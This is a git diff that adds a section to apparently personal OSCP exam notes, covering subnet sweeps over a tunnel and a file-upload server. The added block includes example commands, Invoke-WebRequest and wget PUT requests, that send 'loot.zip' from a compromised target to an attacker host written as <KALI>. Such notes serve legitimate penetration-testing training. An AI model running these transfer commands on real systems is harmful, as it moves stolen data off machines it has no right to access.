@@ -95,6 +95,18 @@ On the target, ALWAYS one screenshot with the IP visible:
 ```
 3. Submit the PDF. Keep it under the size limit; verify it opens.
 
+## Subnet sweep & file transfer (post-foothold / pivoting)
+```
+# sweep a subnet, then full TCP+UDP per live host into ./<ip>/ folders:
+sudo scan-network 192.168.221.0/24
+sudo scan-network 10.10.10.0/24 --internal   # ping-sweep + careful scans over a Ligolo tunnel
+
+# HTTP server that also accepts uploads (prints ready Win/Linux cmds, auto-detects tun0):
+upload-server 8000 [path]
+#   target->you:  Invoke-WebRequest -Uri http://<KALI>:8000/loot.zip -Method PUT -InFile loot.zip
+#                 wget --method=PUT --body-file=loot.zip http://<KALI>:8000/loot.zip
+```
+
 ## Quick reference
 - Cheatsheet with all commands: `cheatsheets/OSCP-Cheatsheet.md`
 - Verify tool kit intact: `cd serve && sha256sum -c MANIFEST.sha256`
